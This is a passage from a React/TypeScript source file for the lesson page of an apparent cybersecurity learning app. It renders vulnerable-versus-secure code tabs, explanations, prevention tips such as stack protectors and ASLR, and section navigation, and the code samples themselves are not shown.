              "Enable compiler security features (-fstack-protector)",
              "Implement Address Space Layout Randomization (ASLR)",
              "Use static analysis tools to detect vulnerabilities"
            ]
          }
        }
      ]
    }
  }
};

const CodeBlock = ({ code, title, type = "vulnerable" }: { code: string; title: string; type?: "vulnerable" | "secure" }) => {
  const [isVisible, setIsVisible] = useState(true);
  const [copied, setCopied] = useState(false);

  const copyCode = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const getTypeColor = () => {
    switch (type) {
      case "vulnerable":
        return "border-danger bg-danger/5";
      case "secure":
        return "border-success bg-success/5";
      default:
        return "border-muted";
    }
  };

  const getTypeIcon = () => {
    switch (type) {
      case "vulnerable":
        return <XCircle className="h-4 w-4 text-danger" />;
      case "secure":
        return <CheckCircle className="h-4 w-4 text-success" />;
      default:
        return <Code className="h-4 w-4" />;
    }
  };

  return (
    <Card className={`${getTypeColor()} transition-all duration-300`}>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            {getTypeIcon()}
            <CardTitle className="text-sm font-medium">{title}</CardTitle>
            <Badge variant={type === "vulnerable" ? "destructive" : type === "secure" ? "default" : "secondary"}>
              {type === "vulnerable" ? "Vulnerable" : type === "secure" ? "Secure" : "Example"}
            </Badge>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setIsVisible(!isVisible)}
              className="h-6 w-6 p-0"
            >
              {isVisible ? <Eye className="h-3 w-3" /> : <EyeOff className="h-3 w-3" />}
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={copyCode}
              className="h-6 w-6 p-0"
            >
              <Copy className="h-3 w-3" />
            </Button>
          </div>
        </div>
      </CardHeader>
      {isVisible && (
        <CardContent className="pt-0">
          <pre className="text-sm bg-muted/50 rounded-md p-3 overflow-x-auto">
            <code>{code}</code>
          </pre>
          {copied && (
            <div className="mt-2 text-xs text-success flex items-center gap-1">
              <CheckCircle className="h-3 w-3" />
              Code copied to clipboard!
            </div>
          )}
        </CardContent>
      )}
    </Card>
  );
};

const Learn = () => {
  const { category = "fundamentals", level } = useParams();
  const { theme } = useTheme();
  const { t } = useLanguage();
  const [currentSection, setCurrentSection] = useState(0);

  // Get current lesson content
  const categoryContent = learnContent[category as keyof typeof learnContent];
  const lessonContent = level ? categoryContent?.[level as keyof typeof categoryContent] : null;
  const currentLessonSection = lessonContent?.sections?.[currentSection];

  if (!categoryContent) {
    return (
      <>
        <AppSidebar />
        <SidebarInset>
          <Header />
          <main className="flex-1 p-6">
            <div className="flex items-center justify-center h-64">
              <div className="text-center">
                <BookOpen className="h-16 w-16 mx-auto mb-4 text-muted-foreground" />
                <h3 className="text-xl font-semibold">Category Not Found</h3>
                <p className="text-muted-foreground">The requested learning category does not exist.</p>
              </div>
            </div>
          </main>
        </SidebarInset>
      </>
    );
  }

  if (!level) {
    // Show category overview
    return (
      <>
        <AppSidebar />
        <SidebarInset>
          <Header />
          <main className="flex-1 p-6">
            <div className="max-w-6xl mx-auto space-y-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-gradient-cyber rounded-lg shadow-glow">
                    <BookOpen className="h-8 w-8 text-white" />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold">{t("learn.mode")}</h1>
                    <p className="text-muted-foreground">{t("learn.guided")}</p>
                  </div>
                </div>
                <CommandPalette />
              </div>

              <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
                {Object.entries(categoryContent).map(([key, content]: [string, any]) => (
                  <Card key={key} className="group hover:shadow-cyber transition-all duration-300 hover:-translate-y-1 cursor-pointer">
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-lg">{content.title}</CardTitle>
                        <ChevronRight className="h-4 w-4 group-hover:translate-x-1 transition-transform" />
                      </div>
                      <p className="text-sm text-muted-foreground">{content.description}</p>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="flex items-center justify-between text-sm">
                        <span>Progress</span>
                        <span className="font-medium">{content.progress}%</span>
                      </div>
                      <Progress value={content.progress} className="h-2" />
                      <div className="flex items-center justify-between text-sm text-muted-foreground">
                        <span>{content.totalLessons} lessons</span>
                        <Badge variant="outline">{Math.ceil(content.totalLessons * content.progress / 100)} completed</Badge>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          </main>
        </SidebarInset>
      </>
    );
  }

  return (
    <>
      <AppSidebar />
      <SidebarInset>
        <Header />
        <main className="flex-1 overflow-hidden">
          <div className="h-full flex">
            {/* Main Content */}
            <div className="flex-1 overflow-auto">
              <div className="p-6 max-w-4xl mx-auto space-y-6">
                {/* Lesson Header */}
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-gradient-cyber rounded-lg shadow-glow">
                    <Shield className="h-8 w-8 text-white" />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold">{lessonContent?.title}</h1>
                    <p className="text-muted-foreground">{lessonContent?.description}</p>
                    <div className="flex items-center gap-4 mt-2">
                      <Progress value={(currentSection + 1) / (lessonContent?.sections.length || 1) * 100} className="h-2 w-48" />
                      <span className="text-sm text-muted-foreground">
                        {currentSection + 1} / {lessonContent?.sections.length}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Current Section Content */}
                {currentLessonSection && (
                  <Card className="border-primary/20">
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Target className="h-5 w-5" />
                        {currentLessonSection.title}
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-6">
                      {/* Theory Section */}
                      {currentLessonSection.content.theory && (
                        <Alert className="border-info bg-info/5">
                          <Info className="h-4 w-4" />
                          <AlertDescription className="text-base">
                            {currentLessonSection.content.theory}
                          </AlertDescription>
                        </Alert>
                      )}

                      {/* Key Points */}
                      {currentLessonSection.content.keyPoints && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Lightbulb className="h-4 w-4 text-warning" />
                            Key Points
                          </h4>
                          <ul className="space-y-1 ml-6">
                            {currentLessonSection.content.keyPoints.map((point: string, index: number) => (
                              <li key={index} className="text-sm text-muted-foreground list-disc">
                                {point}
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}

                      {/* Code Examples */}
                      {currentLessonSection.content.vulnerability && (
                        <div className="space-y-4">
                          <Separator />
                          <h4 className="font-semibold text-lg">Code Examples</h4>
                          
                          <Tabs defaultValue="vulnerable" className="w-full">
                            <TabsList className="grid w-full grid-cols-2">
                              <TabsTrigger value="vulnerable" className="flex items-center gap-2">
                                <Lock className="h-4 w-4" />
                                Vulnerable Code
                              </TabsTrigger>
                              <TabsTrigger value="secure" className="flex items-center gap-2">
                                <Unlock className="h-4 w-4" />
                                Secure Code
                              </TabsTrigger>
                            </TabsList>
                            
                            <TabsContent value="vulnerable" className="space-y-4">
                              <CodeBlock
                                code={currentLessonSection.content.vulnerability.code}
                                title="Vulnerable Implementation"
                                type="vulnerable"
                              />
                              <Alert className="border-danger bg-danger/5">
                                <AlertTriangle className="h-4 w-4" />
                                <AlertDescription>
                                  <strong>Why it's vulnerable:</strong> {currentLessonSection.content.vulnerability.explanation}
                                </AlertDescription>
                              </Alert>
                            </TabsContent>

                            <TabsContent value="secure" className="space-y-4">
                              <CodeBlock
                                code={currentLessonSection.content.secure.code}
                                title="Secure Implementation"
                                type="secure"
                              />
                              <Alert className="border-success bg-success/5">
                                <CheckCircle className="h-4 w-4" />
                                <AlertDescription>
                                  <strong>Why it's secure:</strong> {currentLessonSection.content.secure.explanation}
                                </AlertDescription>
                              </Alert>
                            </TabsContent>
                          </Tabs>
                        </div>
                      )}

                      {/* Prevention Tips */}
                      {currentLessonSection.content.prevention && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Shield className="h-4 w-4 text-success" />
                            Prevention Strategies
                          </h4>
                          <ul className="space-y-1 ml-6">
                            {currentLessonSection.content.prevention.map((tip: string, index: number) => (
                              <li key={index} className="text-sm text-muted-foreground list-disc">
                                {tip}
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                )}

                {/* Navigation */}
                <div className="flex justify-between items-center pt-6">
                  <Button 
                    variant="outline" 
                    disabled={currentSection === 0}
                    onClick={() => setCurrentSection(prev => Math.max(0, prev - 1))}
                  >
                    Previous Section
                  </Button>
                  
                  <div className="flex items-center gap-2">
                    {lessonContent?.sections.map((_, index) => (
                      <div
                        key={index}
                        className={`w-2 h-2 rounded-full ${
                          index === currentSection ? "bg-primary" : 
                          index < currentSection ? "bg-success" : "bg-muted"
                        }`}
                      />
                    ))}
                  </div>

                  <Button 
                    disabled={currentSection === (lessonContent?.sections.length || 0) - 1}
                    onClick={() => setCurrentSection(prev => Math.min((lessonContent?.sections.length || 0) - 1, prev + 1))}
                    className="bg-gradient-cyber"
                  >
                    Next Section
                    <ChevronRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              </div>
            </div>

            {/* Lesson Navigation Sidebar */}
            <div className="w-80 border-l border-border bg-muted/5">
              <ScrollArea className="h-full">
                <div className="p-4 space-y-4">
                  <h3 className="font-semibold">Lesson Sections</h3>
                  
                  <div className="space-y-2">
                    {lessonContent?.sections.map((section, index) => (
                      <Button
                        key={section.id}
                        variant={index === currentSection ? "default" : "ghost"}
                        className="w-full justify-start text-left h-auto p-3"
                        onClick={() => setCurrentSection(index)}
                      >
                        <div className="flex items-start gap-3">
                          <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                            index < currentSection ? "bg-success text-success-foreground" :
                            index === currentSection ? "bg-primary text-primary-foreground" :
                            "bg-muted text-muted-foreground"
                          }`}>
                            {index < currentSection ? <CheckCircle className="h-3 w-3" /> : index + 1}
                          </div>
                          <div className="flex-1 min-w-0">
                            <p className="text-sm font-medium truncate">{section.title}</p>
                            <Badge variant="outline" className="text-xs mt-1">
                              {section.type}
                            </Badge>
                          </div>
                        </div>
                      </Button>
                    ))}
                  </div>
                </div>
              </ScrollArea>
            </div>
          </div>
        </main>
      </SidebarInset>
    </>
  );
};

export default Learn;